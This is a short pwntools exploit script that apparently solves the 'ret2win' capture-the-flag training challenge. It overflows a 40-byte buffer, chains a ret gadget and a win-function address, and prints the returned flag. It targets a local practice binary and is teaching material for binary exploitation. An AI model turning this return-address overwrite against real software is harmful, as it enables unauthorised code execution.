from pwn import *

win = 0x00400756
ret = 0x004006e7

payload = b"".join([
    b"A"*(32+8),
    p64(ret),
    p64(win),
])

p = process("./ret2win")
#input("Waiting for debug")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"flag:\n")
flag = p.recv()
print(f"Flag : {flag}")
